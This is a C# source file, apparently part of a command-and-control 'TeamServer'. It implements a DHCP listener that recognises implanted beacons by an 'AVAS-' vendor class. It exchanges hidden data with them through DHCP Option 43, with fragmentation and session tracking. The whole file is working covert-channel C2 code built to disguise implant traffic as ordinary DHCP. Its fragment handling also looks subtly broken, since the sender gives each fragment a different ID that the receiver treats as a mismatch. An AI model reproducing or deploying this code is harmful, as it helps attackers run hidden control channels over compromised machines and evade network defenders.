using System;
using System.Collections.Concurrent;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using TeamServer.Beacon.Interface;
using TeamServer.Beacon.Models;
using DataList.Beacon.Models;
using TeamServer.HandlePacket;

namespace TeamServer.Listener
{
	internal class DHCPListener : IListener
	{
		private readonly string _bindAddress;
		private readonly int _port;
		private UdpClient? _udp;
		private CancellationTokenSource? _cts;
		private Task? _recvTask;
		private Task? _cleanupTask;
		private readonly TimeSpan _cleanupInterval = TimeSpan.FromSeconds(30);
		private readonly TimeSpan _beaconIdleTimeout = TimeSpan.FromSeconds(60);
		private readonly ConcurrentDictionary<string, BeaconDHCPSession> _sessions = new();
		private readonly ConcurrentDictionary<string, (Dictionary<int, byte[]> fragments, byte fragmentId, DateTime lastUpdate)> _fragmentBuffers = new();

		public DHCPListener(string bindAddress, int port)
		{
			_bindAddress = bindAddress;
			_port = port;
		}

		public bool IsRunning { get; private set; }
		public string Protocol => "DHCP";
		public string BindAddress => _bindAddress;
		public int Port => _port;

		public event Action<IBeaconSession>? OnBeaconConnected;
		public event Action<IBeaconSession>? OnBeaconDisconnected;
		public event Action<DataList.Client.Models.ClientSession>? OnClientConnected;
		public event Action<DataList.Client.Models.ClientSession>? OnClientDisconnected;
		public event Action<Exception>? OnError;

		public async Task StartAsync()
		{
			if (IsRunning) return;
			try
			{
				_udp = new UdpClient(new IPEndPoint(IPAddress.Parse(_bindAddress), _port));
				_udp.Client.ReceiveBufferSize = 1 << 20;
				_udp.Client.SendBufferSize = 1 << 20;
				_cts = new CancellationTokenSource();
				IsRunning = true;
				_recvTask = Task.Run(() => ReceiveLoop(_cts.Token));
				_cleanupTask = Task.Run(() => CleanupLoopAsync(_cts.Token));
				await Task.CompletedTask;
			}
			catch (Exception ex)
			{
				OnError?.Invoke(ex);
				throw;
			}
		}

		public async Task StopAsync()
		{
			if (!IsRunning) return;
			try
			{
				IsRunning = false;
				_cts?.Cancel();
				try { if (_recvTask != null) await _recvTask.ConfigureAwait(false); } catch { }
				try { if (_cleanupTask != null) await _cleanupTask.ConfigureAwait(false); } catch { }
				try { _udp?.Close(); } catch { }
			}
			catch (Exception ex)
			{
				OnError?.Invoke(ex);
				throw;
			}
		}

		private async Task ReceiveLoop(CancellationToken cancellationToken)
		{
			if (_udp == null) return;
			while (!cancellationToken.IsCancellationRequested)
			{
				try
				{
					var result = await _udp.ReceiveAsync(cancellationToken).ConfigureAwait(false);
					ProcessDhcpPacket(result.RemoteEndPoint, result.Buffer);
				}
				catch (OperationCanceledException)
				{
					break;
				}
				catch (ObjectDisposedException)
				{
					break;
				}
				catch (Exception ex)
				{
					OnError?.Invoke(ex);
				}
			}
		}

		private void ProcessDhcpPacket(IPEndPoint remote, byte[] packet)
		{
			if (packet.Length < 240) return; // DHCP 最小长度

			try
			{
				Console.WriteLine($"[DHCP DEBUG] 收到DHCP包，长度: {packet.Length}，来源: {remote}");
				
				// 解析 DHCP 选项
				var options = ParseDhcpOptions(packet);
				Console.WriteLine($"[DHCP DEBUG] 解析到 {options.Count} 个选项");
				
				if (options.TryGetValue(60, out var vendorClassBytes)) // Option 60: Vendor Class Identifier
				{
					var vendorClass = System.Text.Encoding.ASCII.GetString(vendorClassBytes);
					Console.WriteLine($"[DHCP DEBUG] Option 60: {vendorClass}");
					// 检查是否是我们的 Beacon
					if (vendorClass.StartsWith("AVAS-"))
					{
						var session = _sessions.GetOrAdd(remote.ToString(), _ => CreateSession(remote));
						session.Info.LastSeenTime = DateTime.UtcNow;
						
						// 从 Option 43 提取数据
						if (options.TryGetValue(43, out var vendorData))
						{
							// 检查是否是分片数据（检查前4个字节是否为我们的分片格式）
							if (vendorData.Length >= 4 && 
							    vendorData[0] > 0 && vendorData[0] <= 255 && // 分片ID
							    vendorData[1] > 0 && vendorData[1] <= 255 && // 总片数
							    vendorData[2] > 0 && vendorData[2] <= 255 && // 当前片号
							    vendorData[3] == 0) // 保留字节应该为0
							{
								Console.WriteLine($"[DHCP DEBUG] 检测到分片数据: 分片{vendorData[0]}/{vendorData[1]}, 当前片{vendorData[2]}");
								// 这是分片数据，需要重组
								var reassembledData = ReassembleFragments(remote.ToString(), vendorData);
								if (reassembledData != null)
								{
									Console.WriteLine($"[DHCP DEBUG] 分片重组完成，总长度: {reassembledData.Length}");
									session.TriggerDataReceived(reassembledData);
								}
							}
							else
							{
								Console.WriteLine($"[DHCP DEBUG] 直接处理数据，长度: {vendorData.Length}");
								// 直接使用二进制数据
								session.TriggerDataReceived(vendorData);
							}
						}
						else
						{
							Console.WriteLine($"[DHCP DEBUG] 未找到Option 43数据");
						}
					}
				}
			}
			catch (Exception ex)
			{
				OnError?.Invoke(ex);
			}
		}

		private BeaconDHCPSession CreateSession(IPEndPoint remote)
		{
			var session = new BeaconDHCPSession(
				remote,
				data => SendDhcpResponse(remote, data),
				() => _sessions.TryRemove(remote.ToString(), out _))
			{
				Info = new BeaconInfo
				{
					Id = Guid.NewGuid().ToString("N"),
					ListenerId = Protocol,
					IPProt = $"{remote.Address}:{remote.Port}",
					IPAddress = remote.Address.ToString(),
					ConnectedTime = DateTime.UtcNow,
					LastSeenTime = DateTime.UtcNow,
				}
			};

			session.OnDataReceived += async (s, data) =>
			{
				s.Info.LastSeenTime = DateTime.UtcNow;
				try { await BeaconPacketHandle.Read(data, s); } catch (Exception ex) { OnError?.Invoke(ex); }
			};

			session.OnClosed += s =>
			{
				_sessions.TryRemove(remote.ToString(), out _);
				OnBeaconDisconnected?.Invoke(s);
			};

			OnBeaconConnected?.Invoke(session);
			return session;
		}

		private void SendDhcpResponse(IPEndPoint remote, byte[] data)
		{
			if (_udp == null) return;
			try
			{
				// DHCP Option 43 最大255字节，需要分片处理
				const int maxOptionSize = 255;
				if (data.Length <= maxOptionSize)
				{
					// 数据足够小，直接发送
					var response = BuildDhcpResponse(remote, data);
					_udp.Send(response, response.Length, remote);
				}
				else
				{
					// 数据太大，需要分片发送
					SendFragmentedData(remote, data);
				}
			}
			catch (Exception ex)
			{
				Console.WriteLine($"[!] DHCP响应发送失败: {ex.Message}");
			}
		}
		
		private void SendFragmentedData(IPEndPoint remote, byte[] data)
		{
			const int maxOptionSize = 255;
			const int headerSize = 4; // 分片头部大小
			const int maxFragmentSize = maxOptionSize - headerSize;
			
			int totalFragments = (int)Math.Ceiling((double)data.Length / maxFragmentSize);
			
			for (int i = 0; i < totalFragments; i++)
			{
				int start = i * maxFragmentSize;
				int length = Math.Min(maxFragmentSize, data.Length - start);
				
				// 创建分片数据：分片ID(1) + 总片数(1) + 当前片(1) + 数据
				var fragment = new byte[headerSize + length];
				fragment[0] = (byte)(i + 1); // 分片ID
				fragment[1] = (byte)totalFragments; // 总片数
				fragment[2] = (byte)(i + 1); // 当前片号
				Buffer.BlockCopy(data, start, fragment, headerSize, length);
				
				var response = BuildDhcpResponse(remote, fragment);
				_udp.Send(response, response.Length, remote);
				
				// 分片间延迟
				System.Threading.Thread.Sleep(10);
			}
		}

		private byte[] BuildDhcpResponse(IPEndPoint remote, byte[] data)
		{
			// 简化的 DHCP 响应构造
			var packet = new byte[240 + data.Length + 10]; // 基础 + 数据 + 选项
			packet[0] = 0x02; // BOOTREPLY
			packet[1] = 0x01; // 以太网
			packet[2] = 0x06; // 硬件地址长度
			// 其他 DHCP 字段...
			
			// 添加 Option 43
			int offset = 240;
			packet[offset++] = 43; // Option 43
			packet[offset++] = (byte)data.Length;
			Buffer.BlockCopy(data, 0, packet, offset, data.Length);
			offset += data.Length;
			packet[offset++] = 255; // End option
			
			return packet;
		}

		private static Dictionary<int, byte[]> ParseDhcpOptions(byte[] packet)
		{
			var options = new Dictionary<int, byte[]>();
			int offset = 240; // DHCP 选项开始位置
			
			Console.WriteLine($"[DHCP DEBUG] 开始解析DHCP选项，包长度: {packet.Length}，起始偏移: {offset}");
			
			while (offset < packet.Length - 1)
			{
				int option = packet[offset++];
				if (option == 255) 
				{
					Console.WriteLine($"[DHCP DEBUG] 遇到结束选项(255)，停止解析");
					break; // End option
				}
				
				int length = packet[offset++];
				Console.WriteLine($"[DHCP DEBUG] 选项 {option}，长度: {length}，偏移: {offset}");
				
				if (offset + length > packet.Length) 
				{
					Console.WriteLine($"[DHCP DEBUG] 选项长度超出包边界，停止解析");
					break;
				}
				
				var value = new byte[length];
				Buffer.BlockCopy(packet, offset, value, 0, length);
				options[option] = value;
				offset += length;
				
				Console.WriteLine($"[DHCP DEBUG] 选项 {option} 数据: {BitConverter.ToString(value.Take(Math.Min(16, length)).ToArray())}");
			}
			
			Console.WriteLine($"[DHCP DEBUG] 解析完成，共 {options.Count} 个选项");
			return options;
		}


		private async Task CleanupLoopAsync(CancellationToken cancellationToken)
		{
			while (!cancellationToken.IsCancellationRequested)
			{
				try
				{
					CleanupStaleBeacons();
				}
				catch (Exception ex)
				{
					OnError?.Invoke(ex);
				}

				try { await Task.Delay(_cleanupInterval, cancellationToken).ConfigureAwait(false); }
				catch (OperationCanceledException) { break; }
			}
		}

		private byte[]? ReassembleFragments(string endpoint, byte[] fragmentData)
		{
			try
			{
				if (fragmentData.Length < 4) return null;
				
				byte fragmentId = fragmentData[0];
				byte totalFragments = fragmentData[1];
				byte currentFragment = fragmentData[2];
				byte reserved = fragmentData[3];
				
				Console.WriteLine($"[DHCP DEBUG] 处理分片: ID={fragmentId}, 总数={totalFragments}, 当前={currentFragment}, 保留={reserved}");
				
				// 获取或创建分片缓冲区
				var bufferInfo = _fragmentBuffers.GetOrAdd(endpoint, _ => (new Dictionary<int, byte[]>(), (byte)0, DateTime.UtcNow));
				var fragments = bufferInfo.fragments;
				var existingFragmentId = bufferInfo.fragmentId;
				
				// 检查分片ID是否匹配（防止不同数据包的分片混合）
				if (fragments.Count > 0 && existingFragmentId != 0 && existingFragmentId != fragmentId)
				{
					Console.WriteLine($"[DHCP DEBUG] 分片ID不匹配，清理旧缓冲区: 期望={existingFragmentId}, 收到={fragmentId}");
					_fragmentBuffers.TryRemove(endpoint, out _);
					fragments = new Dictionary<int, byte[]>();
				}
				
				// 提取数据部分（跳过4字节头部）
				var data = new byte[fragmentData.Length - 4];
				Buffer.BlockCopy(fragmentData, 4, data, 0, data.Length);
				fragments[currentFragment] = data;
				
				// 更新分片缓冲区信息
				_fragmentBuffers[endpoint] = (fragments, fragmentId, DateTime.UtcNow);
				
				Console.WriteLine($"[DHCP DEBUG] 已收到分片 {currentFragment}/{totalFragments}，数据长度: {data.Length}");
				Console.WriteLine($"[DHCP DEBUG] 当前缓冲区有 {fragments.Count} 个分片");
				
				// 检查是否收到所有分片
				if (fragments.Count == totalFragments)
				{
					Console.WriteLine($"[DHCP DEBUG] 开始重组 {totalFragments} 个分片");
					
					// 验证所有分片都存在
					bool allFragmentsPresent = true;
					for (int i = 1; i <= totalFragments; i++)
					{
						if (!fragments.ContainsKey(i))
						{
							Console.WriteLine($"[DHCP DEBUG] 缺少分片 {i}");
							allFragmentsPresent = false;
							break;
						}
					}
					
					if (allFragmentsPresent)
					{
						// 重组数据
						var reassembled = new List<byte>();
						for (int i = 1; i <= totalFragments; i++)
						{
							if (fragments.TryGetValue(i, out var frag))
							{
								reassembled.AddRange(frag);
								Console.WriteLine($"[DHCP DEBUG] 添加分片 {i}，长度: {frag.Length}");
							}
						}
						
						// 清理分片缓冲区
						_fragmentBuffers.TryRemove(endpoint, out _);
						
						Console.WriteLine($"[DHCP DEBUG] 分片重组完成，总长度: {reassembled.Count}");
						return reassembled.ToArray();
					}
					else
					{
						Console.WriteLine($"[DHCP DEBUG] 分片不完整，继续等待");
						return null;
					}
				}
				
				// 检查是否超时（超过30秒清理缓冲区）
				if (fragments.Count > totalFragments)
				{
					Console.WriteLine($"[DHCP DEBUG] 分片数量异常，清理缓冲区");
					_fragmentBuffers.TryRemove(endpoint, out _);
					return null;
				}
				
				return null; // 还需要更多分片
			}
			catch (Exception ex)
			{
				Console.WriteLine($"[!] 分片重组失败: {ex.Message}");
				// 清理异常的分片缓冲区
				_fragmentBuffers.TryRemove(endpoint, out _);
				return null;
			}
		}

		private void CleanupStaleBeacons()
		{
			var now = DateTime.UtcNow;
			foreach (var session in _sessions.Values.ToArray())
			{
				if ((now - session.Info.LastSeenTime) > _beaconIdleTimeout)
				{
					_sessions.TryRemove(session.Info.IPProt, out _);
					OnBeaconDisconnected?.Invoke(session);
				}
			}
			
			// 清理过期的分片缓冲区
			foreach (var kvp in _fragmentBuffers.ToArray())
			{
				if (!_sessions.ContainsKey(kvp.Key))
				{
					Console.WriteLine($"[DHCP DEBUG] 清理断开会话的分片缓冲区: {kvp.Key}");
					_fragmentBuffers.TryRemove(kvp.Key, out _);
				}
				else if ((now - kvp.Value.lastUpdate) > TimeSpan.FromSeconds(30))
				{
					Console.WriteLine($"[DHCP DEBUG] 清理超时的分片缓冲区: {kvp.Key}，超时时间: {(now - kvp.Value.lastUpdate).TotalSeconds}秒");
					_fragmentBuffers.TryRemove(kvp.Key, out _);
				}
			}
		}
    }
}
